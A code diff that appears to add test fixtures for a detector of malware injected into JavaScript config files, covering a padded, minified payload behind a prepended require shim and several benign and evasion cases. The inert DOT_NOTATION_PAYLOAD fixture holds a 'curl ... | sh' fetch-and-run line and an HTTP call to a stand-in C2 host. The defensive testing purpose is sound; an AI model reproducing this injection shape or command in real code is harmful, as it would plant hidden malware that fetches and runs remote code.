@@ -169,3 +169,101 @@ export const INFECTED_TASKS_NODE = `{
   ]
 }
 `;
+
+// ─── Structural payload fixtures ────────────────────────────────────────────────
+//
+// SYNTHETIC AND INERT. No captured malware bytes appear here. Every hostname
+// uses the reserved .invalid TLD (RFC 6761 — guaranteed never to resolve), the
+// wallet address is all zeroes, and every privileged call sits inside
+// `if (false) { ... }` so the fixture is a no-op even if something executed it.
+//
+// These exercise the STRUCTURE the malware relies on — a dot-notation global
+// write, minification, the prepended createRequire shim, blank-line padding —
+// rather than any particular signature string, which is the whole point: the
+// detector must catch the shape after the signature rotates.
+
+/** The shim the injector PREPENDS so its CommonJS payload can require() inside ESM. */
+export const SHIM_PREFIX =
+  `import { createRequire } from 'module';\n` +
+  `const require = createRequire(import.meta.url);\n`;
+
+/**
+ * Dot-notation global write, minified onto one line, no string-array
+ * obfuscator and NO eval — the variant that slipped past the old detector.
+ */
+export const DOT_NOTATION_PAYLOAD =
+  `global.i = 0;global.r = require;` +
+  `const _c = require("node:child_process"), _h = require("node:http"), _z = require("node:zlib");` +
+  `const _u = "https://c2.example.invalid/beacon", _i = process.env.ETH_RPC_URL;` +
+  `const _w = "0x0000000000000000000000000000000000000000";` +
+  `const _a = new AbortController();` +
+  `if (false) { _c.execSync("curl -fsSL " + _u + " | sh"); ` +
+  `_h.request({ hostname: "c2.example.invalid", headers: { "User-Agent": "Mozilla/5.0" } }); ` +
+  `_z.createGunzip(); Promise.any([]); _w.toString(); ` +
+  `JSON.stringify({ jsonrpc: "2.0", method: "eth_getTransactionCount", id: _i }); }\n`;
+
+/** The full real-world shape: prepended shim, legit config, padding, appended payload. */
+export function infectedDotNotation(legit = LEGIT_CONFIG, pad = 40) {
+  return SHIM_PREFIX + "\n" + legit + "\n".repeat(pad) + DOT_NOTATION_PAYLOAD;
+}
+
+/** A config that GENUINELY uses createRequire — its shim must be preserved. */
+export const LEGIT_SHIM_CONFIG =
+  SHIM_PREFIX +
+  `const tailwindcss = require("tailwindcss");\n` +
+  `export default { plugins: [tailwindcss] };\n`;
+
+/** A shim left behind with no payload and nothing using require: an orphan. */
+export const ORPHAN_SHIM_CONFIG = SHIM_PREFIX + "\n" + LEGIT_CONFIG;
+
+/**
+ * Exactly one weak capability hit after the boundary (an env read beside a
+ * URL). Lands in the review tier: reported, never auto-removed, and not enough
+ * to mark a repo infected.
+ */
+export const LOW_SIGNAL_TAIL =
+  LEGIT_CONFIG +
+  `\nconst hook = process.env.HOOK_URL ?? "https://example.invalid/notify";\n`;
+
+/** Reads a file after the boundary: privileged-looking but not a capability we score. */
+export const FS_ONLY_TAIL =
+  LEGIT_CONFIG + `\nrequire("node:fs").writeFileSync(".cache", "1");\n`;
+
+/** Zero capability after the boundary: must stay clean. */
+export const HARMLESS_TAIL = LEGIT_CONFIG + `\nconsole.log("config loaded");\n`;
+
+/** An idiomatic main-guard after the export — the shape src/ci.js itself has. */
+export const MAIN_GUARD_TAIL =
+  LEGIT_CONFIG +
+  `\nconst direct = process.argv[1] === import.meta.url;\n` +
+  `if (direct) { require("node:child_process").execSync("echo hi"); }\n`;
+
+/** A hand-written post-export dev block: privileged but formatted, so form is 0. */
+export const HANDWRITTEN_DEV_TAIL =
+  LEGIT_CONFIG +
+  `\nif (!process.env.CI) {\n` +
+  `  const http = require("node:http");\n` +
+  `  http.get("http://localhost:3000/health");\n` +
+  `}\n`;
+
+/** Boundary-evasion probe: `export default` in a comment AND in a string. */
+export const COMMENTED_EXPORT_DECOY =
+  `// export default {} - a comment must never become the boundary\n` +
+  `const banner = "export default { fake: true };";\n` +
+  LEGIT_CONFIG;
+
+/** The other evasion direction: a trailing comment claiming to be an export. */
+export function decoyTrailingComment(payload) {
+  return LEGIT_CONFIG + "\n\n\n" + payload + "\n// export default {}\n";
+}
+
+/** A minified legit vendor bundle: high form, zero capability, no top-level export. */
+export const MINIFIED_VENDOR_UMD =
+  `!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?t(exports):` +
+  `"function"==typeof define&&define.amd?define(["exports"],t):t(e.lib={})}(this,function(e){` +
+  `"use strict";var n=` + "0,".repeat(400) + `0;e.n=n;e.f=function(a,b){return a+b}});\n`;
+
+/** A minified legit ESM bundle: exports hoisted last, so the candidate tail is empty. */
+export const MINIFIED_VENDOR_ESM =
+  `const a=` + "1,".repeat(400) + `1;const b=(x)=>x*2;const c=(x)=>b(x)+1;\n` +
+  `export{a as data,b as double,c as bump};\n`;
